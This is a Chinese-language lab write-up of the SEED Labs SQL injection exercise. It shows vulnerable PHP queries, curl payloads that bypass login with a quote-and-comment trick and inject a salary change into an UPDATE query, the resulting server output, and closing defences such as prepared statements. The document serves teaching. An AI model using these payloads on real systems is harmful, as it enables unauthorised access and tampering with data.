# 
#### sql注入之登陆

##### 上帝视角
可以看到登陆时候，php操作mysql时候的sql语句，是通过查询用户输入数据name和password来判断是否有这个用户并登陆。
```
shan@shan-GV62-8RC:~/下载/Labsetup/image_www/Code$ cat unsafe_home.php

...
      // create a connection
      $conn = getDB();
      // Sql query to authenticate the user
      $sql = "SELECT id, name, eid, salary, birth, ssn, phoneNumber, address, email,nickname,Password
      FROM credential
      WHERE name= '$input_uname' and Password='$hashed_pwd'";
...

```

##### 攻击

![](/web-security/img/sql-2.png)


登陆一下，看到接口url是`http://www.seed-server.com/unsafe_home.php?username=Boby&Password=seedboby`GET请求。  

下面通过curl直接调用攻击  
```
curl 'http://www.seed-server.com/unsafe_home.php?username=Boby&Password=aaa'

...
<body>
  <nav class="navbar fixed-top navbar-expand-lg navbar-light" style="background-color: #3EA055;">
    <div class="collapse navbar-collapse" id="navbarTogglerDemo01">
      <a class="navbar-brand" href="unsafe_home.php" ><img src="seed_logo.png" style="height: 40px; width: 200px;" alt="SEEDLabs"></a>

      </div></nav><div class='container text-center'><div class='alert alert-danger'>The account information your provide does not exist.<br></div><a href='index.html'>Go back</a></div>
...
```
用不正确的账号密码没登陆成功`The account information your provide does not exist.`。

如果在username的Boby后面跟一个'(闭合字符串)注释符号(# 或 --)，那么这个sql语句就变成了只从数据库判断是否有这个name的用户并不会判断密码。  
那么sql 语句就变成了`SELECT id, name, eid, salary, birth, ssn, phoneNumber, address, email,nickname,Password FROM credential WHERE name= 'Boby'#' and Password='aaa'`

```
shan@shan-GV62-8RC:~$ curl 'http://www.seed-server.com/unsafe_home.php?username=Boby%27%23&Password=aaa'

...
      <ul class='navbar-nav mr-auto mt-2 mt-lg-0' style='padding-left: 30px;'><li class='nav-item active'><a class='nav-link' href='unsafe_home.php'>Home <span class='sr-only'>(current)</span></a></li><li class='nav-item'><a class='nav-link' href='unsafe_edit_frontend.php'>Edit Profile</a></li></ul><button onclick='logout()' type='button' id='logoffBtn' class='nav-link my-2 my-lg-0'>Logout</button></div></nav><div class='container col-lg-4 col-lg-offset-4 text-center'><br><h1><b> Boby Profile </b></h1><hr><br><table class='table table-striped table-bordered'><thead class='thead-dark'><tr><th scope='col'>Key</th><th scope='col'>Value</th></tr></thead><tr><th scope='row'>Employee ID</th><td>20000</td></tr><tr><th scope='row'>Salary</th><td>30000</td></tr><tr><th scope='row'>Birth</th><td>4/20</td></tr><tr><th scope='row'>SSN</th><td>10213352</td></tr><tr><th scope='row'>NickName</th><td></td></tr><tr><th scope='row'>Email</th><td></td></tr><tr><th scope='row'>Address</th><td></td></tr><tr><th scope='row'>Phone Number</th><td></td></tr></table>      <br><br>
...
```
可以看到登陆成功。

!!! note
    在HTTP发送请求后，它附加的字段需要被编码。所以 '=%27 #=%23 空格=%20


#### sql注入之修改工资

先通过编辑页面编辑并找到url是`http://www.seed-server.com/unsafe_edit_backend.php?NickName=xiaohon&Email=aaa%40qq.com&Address=none&PhoneNumber=13811111111&Password=123456`
![](/web-security/img/sql-3.png)
![](/web-security/img/sql-4.png)


##### 上帝视角
```
shan@shan-GV62-8RC:~/下载/Labsetup/image_www/Code$ cat unsafe_edit_backend.php

...
  if($input_pwd!=''){
    // In case password field is not empty.
    $hashed_pwd = sha1($input_pwd);
    //Update the password stored in the session.
    $_SESSION['pwd']=$hashed_pwd;
    $sql = "UPDATE credential SET nickname='$input_nickname',email='$input_email',address='$input_address',Password='$hashed_pwd',PhoneNumber='$input_phonenumber' where ID=$id;";
  }else{
    // if passowrd field is empty.
    $sql = "UPDATE credential SET nickname='$input_nickname',email='$input_email',address='$input_address',PhoneNumber='$input_phonenumber' where ID=$id;";
  }
  $conn->query($sql);
...
```

##### 攻击
我们只要在任意一个用户输入的字段中在插入一个工资字段Salary  

比如 NickName=xiaohon',Salary='888  
那么sql语句就变成了`UPDATE credential SET nickname='xiaohon',Salary='888',email='$input_email',address='$input_address',Password='$hashed_pwd',PhoneNumber='$input_phonenumber' where ID=$id;"`

注意这个修改接口验证了cookie和session，所以还是想用curl的话需要在请求头带上cookie  
```
curl 'http://www.seed-server.com/unsafe_edit_backend.php?NickName=xiaohon%27%2CSalary%3D%27888&Email=aaa%40qq.com&Address=none&PhoneNumber=13811111111&Password=123456' \
  -H 'Connection: keep-alive' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.106 Safari/537.36' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' \
  -H 'Referer: http://www.seed-server.com/unsafe_edit_frontend.php' \
  -H 'Accept-Language: zh-CN,zh;q=0.9' \
  -H 'Cookie: PHPSESSID=ma8nvssnsq9u9d24fgi54lvts4' \
  --compressed \
  --insecure
```
通过web页面可以看到成功修改了工资

!!! note
    编码 ,=%2C  等号=%3D


#### 根本原因
![](/web-security/img/sql-5.png)
跨站脚本攻击、system()函数攻击、格式化字符串攻击、sql注入攻击根本原因都是数据和代码混在一起。

#### 防御措施
1.过滤代码: 处理用户提交的数据，过滤掉可能会被mysql执行的代码字符  
2.把代码变成数据: 对特殊字符编码，告诉mysql解析器把编码后的字符当作数据而非代码  
3.把代码和数据分开: 比如预处理sql语句，它会先发送一个sql模板到数据库而非发送完成的sql语句。  





